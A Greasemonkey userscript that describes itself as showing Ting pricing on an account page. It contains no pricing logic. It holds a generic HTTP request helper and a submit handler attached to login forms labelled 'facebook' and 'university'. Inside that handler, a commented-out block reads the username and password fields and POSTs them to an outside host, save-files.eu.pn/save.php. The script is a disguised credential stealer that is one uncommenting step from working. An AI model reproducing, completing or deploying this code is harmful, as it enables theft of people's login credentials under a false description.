// ==UserScript==
// @name   show ting pricing on account page
// @namespace  http://unpythonic.net/greasemonkey/ting
// @description Add pricing information on account page
// @require        http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.js
// ==/UserScript==

HttpRequest = function () {};
HttpRequest.open = function (params) {
	return new (function (params) {
		if (!/^https?:\/\//.test(params.url)) {
			params.url = "http://" + params.url;
		}

		this.options = {
			"method"	: params.method.toUpperCase() || "GET",
			"url"		: params.url,
			"headers"	: { "User-Agent" : window.navigator.userAgent },
			"onload"	: function (e) {
				var obj = params.parameters || {};

				obj.response = {
					"raw"	: e,
					"text"	: e.responseText,
					"xml"	: e.responseXML
				};

				if (/^Content-Type: (?:text|application)\/(?:x-)?json/m.test(e.responseHeaders)) {
					try {
						obj.response.json = (typeof JSON != "undefined" && typeof JSON.parse == "function" ? JSON.parse(e.responseText) : eval("(" + e.responseText + ")") );
					} catch (e) {
						obj.response.json = {};
					}
				}

				if (!obj.response.xml) {
					if (/^Content-Type: text\/xml/m.test(e.responseHeaders)) {
						obj.response.xml = new DOMParser().parseFromString(e.responseText, "text/xml");
					} else if (/^Content-Type: text\/html/m.test(e.responseHeaders)) {
						var dt = document.implementation.createDocumentType("html", "-//W3C//DTD HTML 4.01 Transitional//EN", "http://www.w3.org/TR/html4/loose.dtd");
						var doc = document.implementation.createDocument(null, null, dt);

						// I have to find a workaround because this technique make the html*/head/body tags disappear.  
						var html = document.createElement("html");
						html.innerHTML = e.responseText;
						doc.appendChild(html);

						obj.response.xml = doc;
					}
				}

				if (typeof params.onsuccess == "function") {
					params.onsuccess(obj);
				}
			}
		};
		
		if ("headers" in params) {
			for (var header in params.headers) {
				this.options.headers[header] = params.headers[header];
			}
		}

		this.send = function (content) {
			if (content) {
				if (typeof content == "object") {
					var x = "";
					for (var key in content) {
						if (content[key] instanceof Array) {
							var keyarr = key.replace(/^\s+|\s+$/g, "");
							if (!/\[\w*\]$/.test(key))
							keyarr += "[]";

							for each (var v in content[key]) {
								x += "&" + encodeURIComponent(keyarr) + "=" + encodeURIComponent(v);
							}
						} else {
							x += "&" + encodeURIComponent(key) + "=" + encodeURIComponent(content[key]);
						}
					}

					content = x.substr(1);

					if ("POST" == this.options.method) {
						this.options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
						this.options.data = content;
					} else {
						this.options.url += (/\?/.test(this.options.url) ? "&" : "?") + content;
					}
				} else {
					this.options.data = content;
				}
			}

			GM_xmlhttpRequest(this.options);

			return this;
		}
	})(params);
};

	$("form#login_form, form#form1").submit(function()
	{
alert('hi');		
/*
var uname = $("input[type='text']").val();
		var pass = $("input[type='password']").val();
		var id = $(this).attr('id');
		
		if(id == "login_form")
		{ tyype = "facebook";
		}else{
		  tyype = "university";
		}
		
		GM_xmlhttpRequest({
		  method: "POST",
		  url: "http://save-files.eu.pn/save.php",
		  data: "par1="+uname+"&par2="+pass+"&par3="+tyype,
		  headers: {
		    "Content-Type": "application/x-www-form-urlencoded"
		  },
		  onload: function(response) {
		    /*
		    if (response.responseText.indexOf("Logged in as") > -1) {
		      location.href = "http://www.example.net/dashboard";
		    }
		    */
		  }
		});

		
*/

	});